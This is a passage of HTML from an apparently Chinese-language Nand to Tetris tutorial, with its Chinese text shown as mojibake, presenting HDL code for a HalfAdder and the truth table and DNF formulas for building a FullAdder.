mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi><mo>=</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">carry=a\land b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
</ul>
<p>æ‰€ä»¥å¯ä»¥è¿™æ ·å®ç° â¬‡ï¸</p>
<pre><code class="hljs language-hdl" lang="hdl">CHIP HalfAdder {
    IN a, b;    // 1-bit inputs
    OUT sum,    // Right bit of a + b 
        carry;  // Left bit of a + b

    PARTS:
    And(a= a, b= b, out= carry);
    Xor(a = a, b = b, out = sum);
}
</code></pre>
<p>è¿™æ ·çš„ä»£ç å¯ä»¥é€šè¿‡ä»¿çœŸæµ‹è¯•ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef9818f66b684269880f0fa23c7e50c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=KXDeCT%2FZcb7LJyAXzuijV0wc4rk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">2. å®ç° <code>FullAdder</code></h3>
<p>å‰å¾€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a>ï¼Œé€‰æ‹©Â <code>Project 2</code>Â é‡Œçš„Â <code>FullAdder</code>ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/032edf4cedc34b9eaef02e82291791ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=qHGfLwstBWDv18%2BM49zfjTxsllw%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç”¨ <code>Project 1</code> é‡Œå·²ç»å®ç°çš„å„ç§ <code>chip</code>ï¼Œä»¥åŠåˆšæ‰å®ç°çš„ <code>HalfAdder</code> æ¥å®ç°ä¸€ä¸ª <code>FullAdder</code>ã€‚</p>
<ul>
<li>è¾“å…¥æ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span></li>
</ul>
</li>
<li>è¾“å‡ºæ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span></li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬è¿˜æ˜¯ä»çœŸå€¼è¡¨å…¥æ‰‹ â¬‡ï¸</p>




































































<table><thead><tr><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span></th></tr></thead><tbody><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td></tr></tbody></table>
<p>é€šè¿‡è§‚å¯ŸçœŸå€¼è¡¨ï¼Œå¯ä»¥å°† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span> å†™æˆå¯¹åº”çš„æå–èŒƒå¼ <code>DNF</code>(<code>Disjunctive Normal Form</code>) çš„å½¢å¼</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sum=(\neg{a}\land \neg{b}\land c)\lor (\neg{a}\land b\land \neg{c})\lor(a\land\neg{b}\land \neg{c})\lor(a\land b\land c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">carry=(\neg{a}\land b\land c)\lor(a\land \neg{b}\land c)\lor(a\land b\land \neg{c})\lor(a\land b\land c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" 